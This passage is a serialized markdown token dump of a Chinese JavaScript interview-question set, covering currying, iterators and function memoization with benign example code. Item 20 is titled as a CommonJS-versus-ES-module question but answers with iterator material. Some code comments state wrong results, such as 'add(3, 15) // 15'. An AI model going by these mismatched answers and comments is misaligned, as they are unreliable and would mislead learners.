级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（4 分）\\n\\n","depth":4,"text":"解答（4 分）","tokens":[{"type":"text","raw":"解答（4 分）","text":"解答（4 分）","escaped":false}]},{"type":"html","block":true,"raw":"<details>\\n\\n","pre":false,"text":"<details>\\n\\n"},{"type":"paragraph","raw":"给函数传递一部分参数来调用这个函数，并且 当前的这个函数他会在返回一个函数，去处理剩余的参数，见下面 示例：","text":"给函数传递一部分参数来调用这个函数，并且 当前的这个函数他会在返回一个函数，去处理剩余的参数，见下面 示例：","tokens":[{"type":"text","raw":"给函数传递一部分参数来调用这个函数，并且 当前的这个函数他会在返回一个函数，去处理剩余的参数，见下面 示例：","text":"给函数传递一部分参数来调用这个函数，并且 当前的这个函数他会在返回一个函数，去处理剩余的参数，见下面 示例：","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"![](/public/images/3_JavaScript_20241224170424.png)","text":"![](/public/images/3_JavaScript_20241224170424.png)","tokens":[{"type":"image","raw":"![](/public/images/3_JavaScript_20241224170424.png)","href":"/public/images/3_JavaScript_20241224170424.png","title":null,"text":""}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"也就是 拆分函数的参数，这样的就可以叫 柯里化。","text":"也就是 拆分函数的参数，这样的就可以叫 柯里化。","tokens":[{"type":"text","raw":"也就是 拆分函数的参数，这样的就可以叫 柯里化。","text":"也就是 拆分函数的参数，这样的就可以叫 柯里化。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- **1：** 使用函数柯里化的好处？","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 使用函数柯里化的好处？","task":false,"loose":false,"text":"**1：** 使用函数柯里化的好处？","tokens":[{"type":"text","raw":"**1：** 使用函数柯里化的好处？","text":"**1：** 使用函数柯里化的好处？","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 使用函数柯里化的好处？","text":" 使用函数柯里化的好处？","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"在函数式的编程中，尽量 让一个函数处理一个问题，尽可能的单一，而不是将一些问题交给一个方法去解决，就好比 react 的函数式组件，你的一个功能组件是经过多个 UI 组件合成而来的一样，所以我们可以将每次传入的参数在，当前函数中处理，在当前函数处理完成后，在下一个函数中在使用上一个函数的处理结果即可。","text":"在函数式的编程中，尽量 让一个函数处理一个问题，尽可能的单一，而不是将一些问题交给一个方法去解决，就好比 react 的函数式组件，你的一个功能组件是经过多个 UI 组件合成而来的一样，所以我们可以将每次传入的参数在，当前函数中处理，在当前函数处理完成后，在下一个函数中在使用上一个函数的处理结果即可。","tokens":[{"type":"text","raw":"在函数式的编程中，尽量 让一个函数处理一个问题，尽可能的单一，而不是将一些问题交给一个方法去解决，就好比 react 的函数式组件，你的一个功能组件是经过多个 UI 组件合成而来的一样，所以我们可以将每次传入的参数在，当前函数中处理，在当前函数处理完成后，在下一个函数中在使用上一个函数的处理结果即可。","text":"在函数式的编程中，尽量 让一个函数处理一个问题，尽可能的单一，而不是将一些问题交给一个方法去解决，就好比 react 的函数式组件，你的一个功能组件是经过多个 UI 组件合成而来的一样，所以我们可以将每次传入的参数在，当前函数中处理，在当前函数处理完成后，在下一个函数中在使用上一个函数的处理结果即可。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- **1：** 例子","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 例子","task":false,"loose":false,"text":"**1：** 例子","tokens":[{"type":"text","raw":"**1：** 例子","text":"**1：** 例子","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 例子","text":" 例子","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"实现一个给第一个参数加2，给第二个参数乘2的例子","text":"实现一个给第一个参数加2，给第二个参数乘2的例子","tokens":[{"type":"text","raw":"实现一个给第一个参数加2，给第二个参数乘2的例子","text":"实现一个给第一个参数加2，给第二个参数乘2的例子","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"![](/public/images/3_JavaScript_20241224170632.png)","text":"![](/public/images/3_JavaScript_20241224170632.png)","tokens":[{"type":"image","raw":"![](/public/images/3_JavaScript_20241224170632.png)","href":"/public/images/3_JavaScript_20241224170632.png","title":null,"text":""}]},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- **2：** 柯里化函数的实现","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **2：** 柯里化函数的实现","task":false,"loose":false,"text":"**2：** 柯里化函数的实现","tokens":[{"type":"text","raw":"**2：** 柯里化函数的实现","text":"**2：** 柯里化函数的实现","tokens":[{"type":"strong","raw":"**2：**","text":"2：","tokens":[{"type":"text","raw":"2：","text":"2：","escaped":false}]},{"type":"text","raw":" 柯里化函数的实现","text":" 柯里化函数的实现","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\n/**\\n * 多参函数 转 柯里化函数\\n */\\nfunction currying(fn) { // 接受一个函数,返回一个函数\\n    // 这里是接受剩余参数\\n    function receivedParameters(...args) {\\n        // 判断当前已经接受到的参数的个数, 和参数本身(这个参数本身就是一个函数)需要接收到参数是否已经一致\\n        // console.log(fn.length);\\n        // console.log(args.length);\\n        // 到传入函数的参数(fn 的参数) 大于 传入的参数(...args)时,就直接调用传入的函数\\n        if (args.length >= fn.length) {\\n            // 这个 apply 是为了方式外面调用时,绑定了this,而导致这个里面执行 fn 时的混乱\\n            return fn.apply(this, args);\\n        } else {\\n            // 当参数不够的时候, 需要返回一个函数,来接续接收传入的参数,所以 在这 就需要把传入的所有参数,进行一次拼接\\n            return function (...smallArgs) {\\n                // 这个里面用了递归,来检查参数 是否达到,达到了,就运行传入的函数(fn)\\n                return receivedParameters.apply(this, [...args, ...smallArgs])\\n            }\\n        }\\n    }\\n    return receivedParameters\\n}\\n\\n// 使用\\nfunction fun(n, m, b) { // fun的参数个数,是可以 通过 fun.length 拿到的\\n    return n + m + b\\n}\\n\\nconst test = currying(fun);\\n\\nconsole.log(test(1, 2, 3));\\nconsole.log(test(1)(2, 3))\\nconsole.log(test(1)(2)(3));\\n```","lang":"js","text":"/**\\n * 多参函数 转 柯里化函数\\n */\\nfunction currying(fn) { // 接受一个函数,返回一个函数\\n    // 这里是接受剩余参数\\n    function receivedParameters(...args) {\\n        // 判断当前已经接受到的参数的个数, 和参数本身(这个参数本身就是一个函数)需要接收到参数是否已经一致\\n        // console.log(fn.length);\\n        // console.log(args.length);\\n        // 到传入函数的参数(fn 的参数) 大于 传入的参数(...args)时,就直接调用传入的函数\\n        if (args.length >= fn.length) {\\n            // 这个 apply 是为了方式外面调用时,绑定了this,而导致这个里面执行 fn 时的混乱\\n            return fn.apply(this, args);\\n        } else {\\n            // 当参数不够的时候, 需要返回一个函数,来接续接收传入的参数,所以 在这 就需要把传入的所有参数,进行一次拼接\\n            return function (...smallArgs) {\\n                // 这个里面用了递归,来检查参数 是否达到,达到了,就运行传入的函数(fn)\\n                return receivedParameters.apply(this, [...args, ...smallArgs])\\n            }\\n        }\\n    }\\n    return receivedParameters\\n}\\n\\n// 使用\\nfunction fun(n, m, b) { // fun的参数个数,是可以 通过 fun.length 拿到的\\n    return n + m + b\\n}\\n\\nconst test = currying(fun);\\n\\nconsole.log(test(1, 2, 3));\\nconsole.log(test(1)(2, 3))\\nconsole.log(test(1)(2)(3));"},{"type":"space","raw":"\\n\\n"},{"type":"html","block":true,"raw":"</details>\\n\\n","pre":false,"text":"</details>\\n\\n"},{"type":"heading","raw":"## 20. CommonJS和ES6模块的区别？\\n\\n","depth":2,"text":"20. CommonJS和ES6模块的区别？","tokens":[{"type":"text","raw":"20. CommonJS和ES6模块的区别？","text":"20. CommonJS和ES6模块的区别？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（3 分）\\n\\n","depth":4,"text":"解答（3 分）","tokens":[{"type":"text","raw":"解答（3 分）","text":"解答（3 分）","escaped":false}]},{"type":"html","block":true,"raw":"<details>\\n\\n","pre":false,"text":"<details>\\n\\n"},{"type":"list","raw":"- **1：** Iterator 描述","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** Iterator 描述","task":false,"loose":false,"text":"**1：** Iterator 描述","tokens":[{"type":"text","raw":"**1：** Iterator 描述","text":"**1：** Iterator 描述","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" Iterator 描述","text":" Iterator 描述","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"迭代器（iterator），是确使用户可在容器对象（container，例如链表或数组）上遍访的对象，使用该接口无需关心对象的内部实现细节。","text":"迭代器（iterator），是确使用户可在容器对象（container，例如链表或数组）上遍访的对象，使用该接口无需关心对象的内部实现细节。","tokens":[{"type":"text","raw":"迭代器（iterator），是确使用户可在容器对象（container，例如链表或数组）上遍访的对象，使用该接口无需关心对象的内部实现细节。","text":"迭代器（iterator），是确使用户可在容器对象（container，例如链表或数组）上遍访的对象，使用该接口无需关心对象的内部实现细节。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"注：迭代器可以帮助我们去遍历某个数据结构。","text":"注：迭代器可以帮助我们去遍历某个数据结构。","tokens":[{"type":"text","raw":"注：迭代器可以帮助我们去遍历某个数据结构。","text":"注：迭代器可以帮助我们去遍历某个数据结构。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"[文档](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Guide/Iterators_and_Generators#%E8%BF%AD%E4%BB%A3%E5%99%A8)","text":"[文档](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Guide/Iterators_and_Generators#%E8%BF%AD%E4%BB%A3%E5%99%A8)","tokens":[{"type":"link","raw":"[文档](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Guide/Iterators_and_Generators#%E8%BF%AD%E4%BB%A3%E5%99%A8)","href":"https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Guide/Iterators_and_Generators#%E8%BF%AD%E4%BB%A3%E5%99%A8","title":null,"text":"文档","tokens":[{"type":"text","raw":"文档","text":"文档","escaped":false}]}]},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- **2：** 实现一个简单的迭代器","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **2：** 实现一个简单的迭代器","task":false,"loose":false,"text":"**2：** 实现一个简单的迭代器","tokens":[{"type":"text","raw":"**2：** 实现一个简单的迭代器","text":"**2：** 实现一个简单的迭代器","tokens":[{"type":"strong","raw":"**2：**","text":"2：","tokens":[{"type":"text","raw":"2：","text":"2：","escaped":false}]},{"type":"text","raw":" 实现一个简单的迭代器","text":" 实现一个简单的迭代器","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"迭代器是一个对象，但是需要符合[迭代器协议](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Iteration_protocols#%E8%BF%AD%E4%BB%A3%E5%99%A8%E5%8D%8F%E8%AE%AE)。","text":"迭代器是一个对象，但是需要符合[迭代器协议](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Iteration_protocols#%E8%BF%AD%E4%BB%A3%E5%99%A8%E5%8D%8F%E8%AE%AE)。","tokens":[{"type":"text","raw":"迭代器是一个对象，但是需要符合","text":"迭代器是一个对象，但是需要符合","escaped":false},{"type":"link","raw":"[迭代器协议](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Iteration_protocols#%E8%BF%AD%E4%BB%A3%E5%99%A8%E5%8D%8F%E8%AE%AE)","href":"https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Iteration_protocols#%E8%BF%AD%E4%BB%A3%E5%99%A8%E5%8D%8F%E8%AE%AE","title":null,"text":"迭代器协议","tokens":[{"type":"text","raw":"迭代器协议","text":"迭代器协议","escaped":false}]},{"type":"text","raw":"。","text":"。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"[文档](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Iteration_protocols#%E8%BF%AD%E4%BB%A3%E5%99%A8%E5%8D%8F%E8%AE%AE)\\n注：在使用的过程中，根据需求，进行修改。","text":"[文档](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Iteration_protocols#%E8%BF%AD%E4%BB%A3%E5%99%A8%E5%8D%8F%E8%AE%AE)\\n注：在使用的过程中，根据需求，进行修改。","tokens":[{"type":"link","raw":"[文档](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Iteration_protocols#%E8%BF%AD%E4%BB%A3%E5%99%A8%E5%8D%8F%E8%AE%AE)","href":"https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Iteration_protocols#%E8%BF%AD%E4%BB%A3%E5%99%A8%E5%8D%8F%E8%AE%AE","title":null,"text":"文档","tokens":[{"type":"text","raw":"文档","text":"文档","escaped":false}]},{"type":"text","raw":"\\n注：在使用的过程中，根据需求，进行修改。","text":"\\n注：在使用的过程中，根据需求，进行修改。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```javascript\\n/**\\n * 下面就是一个迭代器\\n * 但是他是毫无作用的\\n */\\n/*\\nconst iterator = {\\n    next: function () {\\n        return {done: true, value: \\"test\\"};\\n    }\\n};\\n*/\\n\\n/**\\n * 创建一个迭代器，去访问一个数组\\n * 如果迭代器能够生成序列中的下一个值，则返回 false 布尔值。（这等价于没有指定 done 这个属性。）\\n *\\n * 如果迭代器已将序列迭代完毕，则为 true。这种情况下，value 是可选的，如果它依然存在，即为迭代结束之后的默认返回值。\\n */\\nfunction createArrayIterator(arr) {\\n    let index = 0;\\n    const arrIterator = {\\n        next: function () {\\n            // return {done: false, value: \\"你好\\"};\\n            // return {done: false, value: \\"哈哈\\"};\\n            // return {done: false, value: \\"啊啊\\"};\\n            // return {done: true, value: undefined};\\n            if (index < arr.length) {\\n                return {done: false, value: arr[index++]};\\n            } else {\\n                return {done: true, value: undefined};\\n            }\\n        }\\n    };\\n    return arrIterator;\\n}\\n\\nconst arr1 = [\\"你好\\", \\"哈哈\\", \\"啊啊\\"];\\nconst arr1Iterator = createArrayIterator(arr1);\\n\\nconsole.log(arr1Iterator.next());\\nconsole.log(arr1Iterator.next());\\nconsole.log(arr1Iterator.next());\\n// 前面的都能访问到，后面的就无法访问了\\nconsole.log(arr1Iterator.next());\\nconsole.log(arr1Iterator.next());\\n\\nconst arr2 = [1, 2, 3, 4, 5, 6];\\nconst arr2Iterator = createArrayIterator(arr2);\\nconsole.log(arr2Iterator.next());\\nconsole.log(arr2Iterator.next());\\nconsole.log(arr2Iterator.next());\\nconsole.log(arr2Iterator.next());\\nconsole.log(arr2Iterator.next());\\nconsole.log(arr2Iterator.next());\\nconsole.log(arr2Iterator.next());\\nconsole.log(arr2Iterator.next());\\n```","lang":"javascript","text":"/**\\n * 下面就是一个迭代器\\n * 但是他是毫无作用的\\n */\\n/*\\nconst iterator = {\\n    next: function () {\\n        return {done: true, value: \\"test\\"};\\n    }\\n};\\n*/\\n\\n/**\\n * 创建一个迭代器，去访问一个数组\\n * 如果迭代器能够生成序列中的下一个值，则返回 false 布尔值。（这等价于没有指定 done 这个属性。）\\n *\\n * 如果迭代器已将序列迭代完毕，则为 true。这种情况下，value 是可选的，如果它依然存在，即为迭代结束之后的默认返回值。\\n */\\nfunction createArrayIterator(arr) {\\n    let index = 0;\\n    const arrIterator = {\\n        next: function () {\\n            // return {done: false, value: \\"你好\\"};\\n            // return {done: false, value: \\"哈哈\\"};\\n            // return {done: false, value: \\"啊啊\\"};\\n            // return {done: true, value: undefined};\\n            if (index < arr.length) {\\n                return {done: false, value: arr[index++]};\\n            } else {\\n                return {done: true, value: undefined};\\n            }\\n        }\\n    };\\n    return arrIterator;\\n}\\n\\nconst arr1 = [\\"你好\\", \\"哈哈\\", \\"啊啊\\"];\\nconst arr1Iterator = createArrayIterator(arr1);\\n\\nconsole.log(arr1Iterator.next());\\nconsole.log(arr1Iterator.next());\\nconsole.log(arr1Iterator.next());\\n// 前面的都能访问到，后面的就无法访问了\\nconsole.log(arr1Iterator.next());\\nconsole.log(arr1Iterator.next());\\n\\nconst arr2 = [1, 2, 3, 4, 5, 6];\\nconst arr2Iterator = createArrayIterator(arr2);\\nconsole.log(arr2Iterator.next());\\nconsole.log(arr2Iterator.next());\\nconsole.log(arr2Iterator.next());\\nconsole.log(arr2Iterator.next());\\nconsole.log(arr2Iterator.next());\\nconsole.log(arr2Iterator.next());\\nconsole.log(arr2Iterator.next());\\nconsole.log(arr2Iterator.next());"},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":" ![image-20240202230330197](https://not-have.github.io/file/images/image-20240202230330197.png)","text":" ![image-20240202230330197](https://not-have.github.io/file/images/image-20240202230330197.png)","tokens":[{"type":"text","raw":" ","text":" ","escaped":false},{"type":"image","raw":"![image-20240202230330197](https://not-have.github.io/file/images/image-20240202230330197.png)","href":"https://not-have.github.io/file/images/image-20240202230330197.png","title":null,"text":"image-20240202230330197"}]},{"type":"space","raw":"\\n\\n"},{"type":"html","block":true,"raw":"</details>\\n\\n","pre":false,"text":"</details>\\n\\n"},{"type":"heading","raw":"## 21. JS 如何实现函数缓存\\n\\n","depth":2,"text":"21. JS 如何实现函数缓存","tokens":[{"type":"text","raw":"21. JS 如何实现函数缓存","text":"21. JS 如何实现函数缓存","escaped":false}]},{"type":"heading","raw":"#### 类型：`拓展`\\n\\n","depth":4,"text":"类型：`拓展`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`拓展`","text":"拓展"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（3 分）\\n\\n","depth":4,"text":"解答（3 分）","tokens":[{"type":"text","raw":"解答（3 分）","text":"解答（3 分）","escaped":false}]},{"type":"html","block":true,"raw":"<details>\\n\\n","pre":false,"text":"<details>\\n\\n"},{"type":"list","raw":"- **1：** 是什么","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 是什么","task":false,"loose":false,"text":"**1：** 是什么","tokens":[{"type":"text","raw":"**1：** 是什么","text":"**1：** 是什么","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 是什么","text":" 是什么","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"就是实用一个对象来存储计算过的结果，当再次调用函数时，先检查结果是否已经存在，如果存在，则直接返回结果，否则再进行计算。\\n本质上是实用空间换时间。\\n常用于缓存数据计算和缓存对象：","text":"就是实用一个对象来存储计算过的结果，当再次调用函数时，先检查结果是否已经存在，如果存在，则直接返回结果，否则再进行计算。\\n本质上是实用空间换时间。\\n常用于缓存数据计算和缓存对象：","tokens":[{"type":"text","raw":"就是实用一个对象来存储计算过的结果，当再次调用函数时，先检查结果是否已经存在，如果存在，则直接返回结果，否则再进行计算。\\n本质上是实用空间换时间。\\n常用于缓存数据计算和缓存对象：","text":"就是实用一个对象来存储计算过的结果，当再次调用函数时，先检查结果是否已经存在，如果存在，则直接返回结果，否则再进行计算。\\n本质上是实用空间换时间。\\n常用于缓存数据计算和缓存对象：","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\nconst add = (a,b) => a+b;\\nconst calc = memoize(add); // 函数缓存\\ncalc(10,20);// 30\\ncalc(10,20);// 30 缓存\\n```","lang":"js","text":"const add = (a,b) => a+b;\\nconst calc = memoize(add); // 函数缓存\\ncalc(10,20);// 30\\ncalc(10,20);// 30 缓存"},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- **2：** 实现","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **2：** 实现","task":false,"loose":false,"text":"**2：** 实现","tokens":[{"type":"text","raw":"**2：** 实现","text":"**2：** 实现","tokens":[{"type":"strong","raw":"**2：**","text":"2：","tokens":[{"type":"text","raw":"2：","text":"2：","escaped":false}]},{"type":"text","raw":" 实现","text":" 实现","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"注：函数缓存主要依靠 `闭包、柯里化、高阶函数`","text":"注：函数缓存主要依靠 `闭包、柯里化、高阶函数`","tokens":[{"type":"text","raw":"注：函数缓存主要依靠 ","text":"注：函数缓存主要依靠 ","escaped":false},{"type":"codespan","raw":"`闭包、柯里化、高阶函数`","text":"闭包、柯里化、高阶函数"}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"##### 1）闭包\\n\\n","depth":5,"text":"1）闭包","tokens":[{"type":"text","raw":"1）闭包","text":"1）闭包","escaped":false}]},{"type":"code","raw":"```js\\n(function() {\\n    var a = 1; // 在 IIFE (立即调用的函数表达式) 内部定义了变量 a\\n    function add() {\\n        const b = 2; // 在 add 函数内部定义了变量 b\\n        let sum = b + a; // sum 是 add 函数内部的局部变量，b 和 a 都在其作用域内\\n        console.log(sum); // 输出 3\\n    }\\n    \\n    add(); // 调用 add 函数\\n})();\\n```","lang":"js","text":"(function() {\\n    var a = 1; // 在 IIFE (立即调用的函数表达式) 内部定义了变量 a\\n    function add() {\\n        const b = 2; // 在 add 函数内部定义了变量 b\\n        let sum = b + a; // sum 是 add 函数内部的局部变量，b 和 a 都在其作用域内\\n        console.log(sum); // 输出 3\\n    }\\n    \\n    add(); // 调用 add 函数\\n})();"},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"##### 2）柯里化\\n\\n","depth":5,"text":"2）柯里化","tokens":[{"type":"text","raw":"2）柯里化","text":"2）柯里化","escaped":false}]},{"type":"code","raw":"```js\\n// 非函数柯里化\\nvar add = function (x,y) {\\n    return x+y;\\n}\\nadd(3, 15) // 15\\n\\n// 函数柯里化\\nvar add2 = function (x) {\\n    return function (y) {\\n        return x+y;\\n    }\\n}\\nconst str = add2(3)(15) //15\\n\\nconsole.log(`永远喜欢 ${str} 岁的 girl ！！！`);\\n```","lang":"js","text":"// 非函数柯里化\\nvar add = function (x,y) {\\n    return x+y;\\n}\\nadd(3, 15) // 15\\n\\n// 函数柯里化\\nvar add2 = function (x) {\\n    return function (y) {\\n        return x+y;\\n    }\\n}\\nconst str = add2(3)(15) //15\\n\\nconsole.log(`永远喜欢 ${str} 岁的 girl ！！！`);"},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"##### 3）高阶函数\\n\\n","depth":5,"text":"3）高阶函数","tokens":[{"type":"text","raw":"3）高阶函数","text":"3）高阶函数","escaped":false}]},{"type":"code","raw":"```js\\nfunction foo(){\\n  var a = 2;\\n\\n  function bar() {\\n    console.log(a);\\n  }\\n  return bar;\\n}\\nvar baz = foo();\\nbaz();\\n```","lang":"js","text":"function foo(){\\n  var a = 2;\\n\\n  function bar() {\\n    console.log(a);\\n  }\\n  return bar;\\n}\\nvar baz = foo();\\nbaz();"},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"##### 4）实现函数缓存\\n\\n","depth":5,"text":"4）实现函数缓存","tokens":[{"type":"text","raw":"4）实现函数缓存","text":"4）实现函数缓存","escaped":false}]},{"type":"code","raw":"```js\\nvar add = function (x, y) {\\n    return x + y;\\n}\\n\\n/**\\n * 函数缓存\\n * \\n * @param {*} func 要缓存的函数\\n * @param {*} content 上下文\\n */\\nconst memoize = function (func, content) {\\n  // 创建一个缓存对象，用来存储已计算的结果，避免重复计算\\n  let cache = Object.create(null)\\n\\n  // 如果没有传递 content 参数，则将 content 设置为当前上下文 this\\n  content = content || this\\n  \\n  // 返回一个新的函数，它会接收传入的参数，并进行缓存判断\\n  return (...key) => {\\n    // 使用 JSON.stringify 将 key 数组转换为字符串，确保相同的参数值被一致缓存\\n    const cacheKey = JSON.stringify(key);\\n\\n    // 检查缓存中是否已经存储了当前参数的计算结果\\n    if (!cache[cacheKey]) {\\n      // 如果缓存中没有，调用 func 并将结果存储在 cache 中\\n      // func.apply(content, key) 用来调用 func，传递 content 作为上下文，key 作为参数\\n      cache[cacheKey] = func.apply(content, key);\\n    }\\n    \\n    // 返回缓存中的结果（如果已计算过）\\n    return cache[cacheKey];\\n  }\\n}\\n\\n/**\\n * 使用\\n */\\nconst calc = memoize(add);\\nconst num1 = calc(100, 200);  // 计算并缓存结果\\nconsole.log(num1);  // 300\\n\\nconst num2 = calc(100, 200);  // 从缓存中获取结果\\nconsole.log(num2);  // 300\\n```","lang":"js","text":"var add = function (x, y) {\\n    return x + y;\\n}\\n\\n/**\\n * 函数缓存\\n * \\n * @param {*} func 要缓存的函数\\n * @param {*} content 上下文\\n */\\nconst memoize = function (func, content) {\\n  // 创建一个缓存对象，用来存储已计算的结果，避免重复计算\\n  let cache = Object.create(null)\\n\\n  // 如果没有传递 content 参数，则将 content 设置为当前上下文 this\\n  content = content || this\\n  \\n  // 返回一个新的函数，它会接收传入的参数，并进行缓存判断\\n  return (...key) => {\\n    // 使用 JSON.stringify 将 key 数组转换为字符串，确保相同的参数值被一致缓存\\n    const cacheKey = JSON.stringify(key);\\n\\n    // 检查缓存中是否已经存储了当前参数的计算结果\\n    if (!cache[cacheKey]) {\\n      // 如果缓存中没有，调用 func 并将结果存储在 cache 中\\n      // func.apply(content, key) 用来调用 func，传递 content 作为上下文，key 作为参数\\n      cache[cacheKey] = func.apply(content, key);\\n    }\\n    \\n    // 返回缓存中的结果（如果已计算过）\\n    return cache[cacheKey];\\n  }\\n}\\n\\n/**\\n * 使用\\n */\\nconst calc = memoize(add);\\nconst num1 = calc(100, 200);  // 计算并缓存结果\\nconsole.log(num1);  // 300\\n\\nconst num2 = calc(100, 200);  // 从缓存中获取结果\\nconsole.log(num2);  // 300"},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"##### 5）使用场景\\n\\n","depth":5,"text":"5）使用场景","tokens":[{"type":"text","raw":"5）使用场景","text":"5）使用场景","escaped":false}]},{"type":"paragraph","raw":"对于昂贵的函数调用，执行复杂计算的函数\\n对于具有有限且高度重复输入范围的函数\\n对于具有重复输入值的递归函数\\n对于纯函数，即每次使用特定输入调用时返回相同输出的函数","text":"对于昂贵的函数调用，执行复杂计算的函数\\n对于具有有限且高度重复输入范围的函数\\n对于具有重复输入值的递归函数\\n对于纯函数，即每次使用特定输入调用时返回相同输出的函数","tokens":[{"type":"text","raw":"对于昂贵的函数调用，执行复杂计算的函数\\n对于具有有限且高度重复输入范围的函数\\n对于具有重复输入值的递归函数\\n对于纯函数，即每次使用特定输入调用时返回相同输出的函数","text":"对于昂贵的函数调用，执行复杂计算的函数\\n对于具有有限且高度重复输入范围的函数\\n对于具有重复输入值的递归函数\\n对于纯函数，即每次使用特定输入调用时返回相同输出的函数","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"html","block":true,"raw":"</details>\\n\\n","pre":false,"text":"</details>\\n\\n"},{"type":"heading","raw":"## 22. 